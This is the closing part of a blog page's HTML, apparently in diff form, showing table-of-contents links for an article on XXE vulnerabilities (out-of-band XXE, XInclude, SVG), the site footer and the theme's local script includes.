href="#0x07-%E6%97%A0%E5%9B%9E%E6%98%BEXXE%E5%B8%A6%E5%A4%96%E6%95%B0%E6%8D%AE"><span class="toc-article-text">0x07.无回显XXE带外数据</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x08-Xinclude"><span class="toc-article-text">0x08.Xinclude</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x09-%E4%BD%BF%E7%94%A8SVG%E8%BF%9B%E8%A1%8CXXE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-article-text">0x09.使用SVG进行XXE漏洞利用</span></a></li></ol>
+			</div>
+		
+		</div>
+	</div>
+
+</div><!-- col-md-3 -->
+
+
+		</div>
+
+		
+
+	</div><!-- row -->
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2026 ZQ-Rookie-Hacker's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/toc.js"></script>
+<script src="/js/copy-code.js"></script>
+
+   <script type="text/javascript">
+     var searchPath = "/search.xml";
+   </script>
+
+
+<script src="/js/search.js"></script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+</body>
+   </html>
